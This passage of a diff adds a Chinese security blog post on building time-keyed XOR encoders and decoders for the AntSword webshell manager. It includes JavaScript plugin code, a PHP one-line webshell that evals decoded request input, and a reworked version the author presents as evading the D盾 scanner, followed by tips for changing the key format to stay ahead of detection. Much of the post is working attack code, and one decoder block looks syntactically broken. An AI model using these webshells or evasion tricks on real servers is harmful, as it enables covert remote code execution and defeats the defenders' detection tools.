+</span></span><span class="line"><span class="cl">    return cipher;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  data[&#39;_&#39;] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);
+</span></span><span class="line"><span class="cl">  data[pwd] = `eval(base64_decode(&#34;${data[&#39;_&#39;]}&#34;));`;
+</span></span><span class="line"><span class="cl">  data[pwd]=xor(data[pwd]);
+</span></span><span class="line"><span class="cl">  delete data[&#39;_&#39;];
+</span></span><span class="line"><span class="cl">  return data;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385510-8c630df2-9000-4e1b-bf77-49a0182a59b1.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385510-8c630df2-9000-4e1b-bf77-49a0182a59b1.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385510-8c630df2-9000-4e1b-bf77-49a0182a59b1.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385510-8c630df2-9000-4e1b-bf77-49a0182a59b1.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385510-8c630df2-9000-4e1b-bf77-49a0182a59b1.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385510-8c630df2-9000-4e1b-bf77-49a0182a59b1.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="动态秘钥解码器" class="headerLink">
+    <a href="#%e5%8a%a8%e6%80%81%e7%a7%98%e9%92%a5%e8%a7%a3%e7%a0%81%e5%99%a8" class="header-mark"></a>4.2 动态秘钥解码器</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;use strict&#39;;
+</span></span><span class="line"><span class="cl">//code by yzddmr6
+</span></span><span class="line"><span class="cl">module.exports = {
+</span></span><span class="line"><span class="cl">  /**
+</span></span><span class="line"><span class="cl">   * @returns {string} asenc 将返回数据base64编码
+</span></span><span class="line"><span class="cl">   * 自定义输出函数名称必须为 asenc
+</span></span><span class="line"><span class="cl">   * 该函数使用的语法需要和shell保持一致
+</span></span><span class="line"><span class="cl">   */
+</span></span><span class="line"><span class="cl">  asoutput: () =&gt; {
+</span></span><span class="line"><span class="cl">    return `function asenc($out){
+</span></span><span class="line"><span class="cl">      date_default_timezone_set(&#34;PRC&#34;);
+</span></span><span class="line"><span class="cl">      $key=md5(date(&#34;Y-m-d H:i&#34;,time()));
+</span></span><span class="line"><span class="cl">      for($i=0;$i&lt;strlen($out);$i++){
+</span></span><span class="line"><span class="cl">          $out[$i] = $out[$i] ^ $key[$i%32];
+</span></span><span class="line"><span class="cl">      }
+</span></span><span class="line"><span class="cl">      return @base64_encode($out);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    `.replace(/\n\s+/g, &#39;&#39;);
+</span></span><span class="line"><span class="cl">  },
+</span></span><span class="line"><span class="cl">  /**
+</span></span><span class="line"><span class="cl">   * 解码 Buffer
+</span></span><span class="line"><span class="cl">   * @param {string} data 要被解码的 Buffer
+</span></span><span class="line"><span class="cl">   * @returns {string} 解码后的 Buffer
+</span></span><span class="line"><span class="cl">   */
+</span></span><span class="line"><span class="cl">  decode_buff: (data, ext={}) =&gt; {
+</span></span><span class="line"><span class="cl">    function xor(payload){
+</span></span><span class="line"><span class="cl">      let crypto = require(&#39;crypto&#39;);
+</span></span><span class="line"><span class="cl">      Object.assign(Date.prototype, {
+</span></span><span class="line"><span class="cl">          switch (time) {
+</span></span><span class="line"><span class="cl">              let date = {
+</span></span><span class="line"><span class="cl">                  &#34;yy&#34;: this.getFullYear(),
+</span></span><span class="line"><span class="cl">                  &#34;MM&#34;: this.getMonth() + 1,
+</span></span><span class="line"><span class="cl">                  &#34;dd&#34;: this.getDate(),
+</span></span><span class="line"><span class="cl">                  &#34;hh&#34;: this.getHours(),
+</span></span><span class="line"><span class="cl">                  &#34;mm&#34;: this.getMinutes(),
+</span></span><span class="line"><span class="cl">                  &#34;ss&#34;: this.getSeconds()
+</span></span><span class="line"><span class="cl">              };
+</span></span><span class="line"><span class="cl">              if (/(y+)/i.test(time)) {
+</span></span><span class="line"><span class="cl">                  time = time.replace(RegExp.$1, (this.getFullYear() + &#39;&#39;).substr(4 - RegExp.$1.length));
+</span></span><span class="line"><span class="cl">              }
+</span></span><span class="line"><span class="cl">              Object.keys(date).forEach(function (i) {
+</span></span><span class="line"><span class="cl">                  if (new RegExp(&#34;(&#34; + i + &#34;)&#34;).test(time)) {
+</span></span><span class="line"><span class="cl">                      if (RegExp.$1.length == 2) {
+</span></span><span class="line"><span class="cl">                          date[i] &lt; 10 ? date[i] = &#39;0&#39; + date[i] : date[i];
+</span></span><span class="line"><span class="cl">                      }
+</span></span><span class="line"><span class="cl">                      time = time.replace(RegExp.$1, date[i]);
+</span></span><span class="line"><span class="cl">                  }
+</span></span><span class="line"><span class="cl">              })
+</span></span><span class="line"><span class="cl">              return time;
+</span></span><span class="line"><span class="cl">          }
+</span></span><span class="line"><span class="cl">      })
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">      let newDate = new Date();
+</span></span><span class="line"><span class="cl">      let time = newDate.switch(&#39;yyyy-MM-dd hh:mm&#39;);
+</span></span><span class="line"><span class="cl">      let key = crypto.createHash(&#39;md5&#39;).update(time).digest(&#39;hex&#39;)
+</span></span><span class="line"><span class="cl">      key = key.split(&#34;&#34;).map(t =&gt; t.charCodeAt(0));
+</span></span><span class="line"><span class="cl">      let data = payload;
+</span></span><span class="line"><span class="cl">      let cipher=Buffer.from(data.toString(), &#39;base64&#39;).toString();
+</span></span><span class="line"><span class="cl">      cipher = cipher.split(&#34;&#34;).map(t =&gt; t.charCodeAt(0));
+</span></span><span class="line"><span class="cl">      for (let i = 0; i &lt; cipher.length; i++) {
+</span></span><span class="line"><span class="cl">          cipher[i] = cipher[i] ^ key[i % 32]
+</span></span><span class="line"><span class="cl">      }
+</span></span><span class="line"><span class="cl">      cipher=cipher.map(t=&gt;String.fromCharCode(t)).join(&#34;&#34;)
+</span></span><span class="line"><span class="cl">      return cipher;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    return xor(data);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385664-cf19cd11-5cbd-4e78-9210-d78d2502bcdb.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385664-cf19cd11-5cbd-4e78-9210-d78d2502bcdb.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385664-cf19cd11-5cbd-4e78-9210-d78d2502bcdb.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385664-cf19cd11-5cbd-4e78-9210-d78d2502bcdb.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385664-cf19cd11-5cbd-4e78-9210-d78d2502bcdb.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385664-cf19cd11-5cbd-4e78-9210-d78d2502bcdb.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385848-5fb2c5c8-9bf8-4804-a48d-15f375627b13.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385848-5fb2c5c8-9bf8-4804-a48d-15f375627b13.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385848-5fb2c5c8-9bf8-4804-a48d-15f375627b13.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385848-5fb2c5c8-9bf8-4804-a48d-15f375627b13.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385848-5fb2c5c8-9bf8-4804-a48d-15f375627b13.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385848-5fb2c5c8-9bf8-4804-a48d-15f375627b13.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>但是发现遇到中文会乱码，所以仅作为一个参考吧</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385963-525e7d95-c6dd-4725-9f2e-1a67f6ce375f.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385963-525e7d95-c6dd-4725-9f2e-1a67f6ce375f.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385963-525e7d95-c6dd-4725-9f2e-1a67f6ce375f.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385963-525e7d95-c6dd-4725-9f2e-1a67f6ce375f.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385963-525e7d95-c6dd-4725-9f2e-1a67f6ce375f.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385963-525e7d95-c6dd-4725-9f2e-1a67f6ce375f.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="服务端" class="headerLink">
+    <a href="#%e6%9c%8d%e5%8a%a1%e7%ab%af" class="header-mark"></a>4.3 服务端</h3><p>原型</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">date_default_timezone_set(&#34;PRC&#34;);
+</span></span><span class="line"><span class="cl">@$post=base64_decode($_REQUEST[&#39;yzddmr6&#39;]);
+</span></span><span class="line"><span class="cl">$key=md5(date(&#34;Y-m-d H:i&#34;,time()));
+</span></span><span class="line"><span class="cl">for($i=0;$i&lt;strlen($post);$i++){
+</span></span><span class="line"><span class="cl">    $post[$i] = $post[$i] ^ $key[$i%32];
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">eval($post);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386075-e6acd59f-ebc4-456c-91f4-91d0117dcf3c.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386075-e6acd59f-ebc4-456c-91f4-91d0117dcf3c.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386075-e6acd59f-ebc4-456c-91f4-91d0117dcf3c.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386075-e6acd59f-ebc4-456c-91f4-91d0117dcf3c.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386075-e6acd59f-ebc4-456c-91f4-91d0117dcf3c.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386075-e6acd59f-ebc4-456c-91f4-91d0117dcf3c.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>D盾4级，稍微处理一下让他免杀</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">date_default_timezone_set(&#34;PRC&#34;);
+</span></span><span class="line"><span class="cl">$key=md5(date(&#34;Y-m-d H:i&#34;,time()));
+</span></span><span class="line"><span class="cl">class TEST{
+</span></span><span class="line"><span class="cl">    function encode($key){
+</span></span><span class="line"><span class="cl">    @$post=base64_decode($_REQUEST[&#39;test&#39;]);
+</span></span><span class="line"><span class="cl">    for($i=0;$i&lt;strlen($post);$i++){$post[$i] = $post[$i] ^ $key[$i%32];}
+</span></span><span class="line"><span class="cl">    return $post;}
+</span></span><span class="line"><span class="cl">    function ant($data)
+</span></span><span class="line"><span class="cl">    {return eval($this-&gt;encode(&#34;$data&#34;));}
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$test=new TEST;
+</span></span><span class="line"><span class="cl">$test-&gt;ant($key);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386199-cc4d0fb0-0207-43f4-bf62-31aa46a60d90.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386199-cc4d0fb0-0207-43f4-bf62-31aa46a60d90.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386199-cc4d0fb0-0207-43f4-bf62-31aa46a60d90.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386199-cc4d0fb0-0207-43f4-bf62-31aa46a60d90.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386199-cc4d0fb0-0207-43f4-bf62-31aa46a60d90.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386199-cc4d0fb0-0207-43f4-bf62-31aa46a60d90.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="测试" class="headerLink">
+    <a href="#%e6%b5%8b%e8%af%95" class="header-mark"></a>5 测试</h2><p>在蚁剑中新建编码器 解码器，然后起一个你喜欢的名字，把上面的代码复制进去即可。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386345-3823971a-ee17-4c35-bf61-537ae0a60ac1.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386345-3823971a-ee17-4c35-bf61-537ae0a60ac1.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386345-3823971a-ee17-4c35-bf61-537ae0a60ac1.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386345-3823971a-ee17-4c35-bf61-537ae0a60ac1.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386345-3823971a-ee17-4c35-bf61-537ae0a60ac1.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386345-3823971a-ee17-4c35-bf61-537ae0a60ac1.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>配置一下就可以使用啦</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386450-c9827cc0-5651-4204-8527-df817b3fb63c.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386450-c9827cc0-5651-4204-8527-df817b3fb63c.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386450-c9827cc0-5651-4204-8527-df817b3fb63c.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386450-c9827cc0-5651-4204-8527-df817b3fb63c.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386450-c9827cc0-5651-4204-8527-df817b3fb63c.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386450-c9827cc0-5651-4204-8527-df817b3fb63c.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386540-b70b6dc2-9d76-4fc5-9fc1-014f8fa9c889.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386540-b70b6dc2-9d76-4fc5-9fc1-014f8fa9c889.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386540-b70b6dc2-9d76-4fc5-9fc1-014f8fa9c889.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386540-b70b6dc2-9d76-4fc5-9fc1-014f8fa9c889.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386540-b70b6dc2-9d76-4fc5-9fc1-014f8fa9c889.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386540-b70b6dc2-9d76-4fc5-9fc1-014f8fa9c889.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386723-f5b68754-4d55-4d25-9059-902cf88da27a.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386723-f5b68754-4d55-4d25-9059-902cf88da27a.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386723-f5b68754-4d55-4d25-9059-902cf88da27a.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386723-f5b68754-4d55-4d25-9059-902cf88da27a.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386723-f5b68754-4d55-4d25-9059-902cf88da27a.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386723-f5b68754-4d55-4d25-9059-902cf88da27a.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>没错，我用的就是著名的backdoorstudy</p>
+<p>你可以同时使用动态秘钥编码器跟动态秘钥解码器，也可以只使用编码器，或者动态编码器跟其他解码器结合。</p>
+<p>要注意的是，因为一些玄学问题，当你使用了demo中的动态解码器后遇见中文会乱码。</p>
+<p>个人建议 动态秘钥编码器+base64解码器 就差不多了。</p>
+<h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>6 最后</h2><p>在demo中用的是<code>年-月-日 时-分</code>的时间格式，可能过不了多久也会被检测。</p>
+<p>如果以后被加入豪华午餐的话，自己可以自由修改日期的格式，例如<code>日-年-月 时-分</code>，或者 <code>日期+盐</code> 来达到混淆的效果</p>
+<p>在编码器中已经留好了日期格式修改的接口，换一换顺序即可。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386828-f0a43108-757f-4400-ada0-9c1071dc74e6.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386828-f0a43108-757f-4400-ada0-9c1071dc74e6.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386828-f0a43108-757f-4400-ada0-9c1071dc74e6.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386828-f0a43108-757f-4400-ada0-9c1071dc74e6.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386828-f0a43108-757f-4400-ada0-9c1071dc74e6.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386828-f0a43108-757f-4400-ada0-9c1071dc74e6.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>通过以上操作我们已经实现了无需握手传递秘钥的编码器解码器</p>
+<p>到这里好像没什么问题了</p>
+<p>但是发现蚁剑默认的payload会把data[]数组中其他的参数只是base64一遍</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386950-6f20457f-e491-4210-aa2a-b92a140b7e96.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386950-6f20457f-e491-4210-aa2a-b92a140b7e96.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386950-6f20457f-e491-4210-aa2a-b92a140b7e96.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386950-6f20457f-e491-4210-aa2a-b92a140b7e96.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386950-6f20457f-e491-4210-aa2a-b92a140b7e96.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386950-6f20457f-e491-4210-aa2a-b92a140b7e96.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900387107-f37be75a-820f-48e0-aeb1-c0f8498a30e6.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900387107-f37be75a-820f-48e0-aeb1-c0f8498a30e6.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900387107-f37be75a-820f-48e0-aeb1-c0f8498a30e6.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900387107-f37be75a-820f-48e0-aeb1-c0f8498a30e6.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900387107-f37be75a-820f-48e0-aeb1-c0f8498a30e6.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900387107-f37be75a-820f-48e0-aeb1-c0f8498a30e6.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>这样的流量还是容易被检测出，这也是蚁剑的硬伤。</p>
+<p>在这篇文章里<a href="https://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZw" target="_blank" rel="noopener noreferrer">WAF拦了蚁剑发送的其它参数时怎么操作</a>蚁剑作者也给出了解决方案</p>
+<p>但是这样修改的话只是针对一个编码器，不能对所有的编码器有效</p>
+<p>最稳固的办法还是自己修改蚁剑硬编码的payload，来满足自己的需求。</p>
+<p>本文只是抛砖引玉，没什么技术含量，还望大佬们轻喷。</p>
+<h2 id="参考文章" class="headerLink">
+    <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" class="header-mark"></a>7 参考文章</h2><p><a href="https://mp.weixin.qq.com/s/uITAIt-jj3-CYKwXQqFzMw" target="_blank" rel="noopener noreferrer">https://mp.weixin.qq.com/s/uITAIt-jj3-CYKwXQqFzMw</a></p>
+<p><a href="https://mp.weixin.qq.com/s/IUs3YbWKSAE2ptAw1nrJyg" target="_blank" rel="noopener noreferrer">https://mp.weixin.qq.com/s/IUs3YbWKSAE2ptAw1nrJyg</a></p>
+<p><a href="https://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZw" target="_blank" rel="noopener noreferrer">https://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZw</a></p>
+<p><a href="https://xz.aliyun.com/t/2774" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/2774</a></p>
+</div>
+
+        
+
+
+<h2>相关内容</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/as-exploits/">As-Exploits: 中国蚁剑后渗透框架</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/antsword-diy-4/">中国蚁剑源码分析</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/antsword-diy-3/">蚁剑改造计划之实现JSP一句话</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/antsword-diy-2/">蚁剑改造计划之实现其他参数的随机化</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/jsp-classload-backdoor/">[知识星球]JSP类加载后门</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-10-15</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/antsword-xor-encoder/" data-title="蚁剑实现动态秘钥编码器解码器" data-hashtags="免杀,中国蚁剑"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/antsword-xor-encoder/" data-hashtag="免杀"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/antsword-xor-encoder/" data-title="蚁剑实现动态秘钥编码器解码器"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/antsword-xor-encoder/" data-title="蚁剑实现动态秘钥编码器解码器"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/antsword-xor-encoder/" data-title="蚁剑实现动态秘钥编码器解码器"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/antsword-xor-encoder/" data-title="蚁剑实现动态秘钥编码器解码器" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;蚁剑实现动态秘钥编码器解码器&#34;, &#34;https://yzddmr6.com/posts/antsword-xor-encoder/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%85%8D%E6%9D%80/">免杀</a>,&nbsp;<a href="/tags/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/">中国蚁剑</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
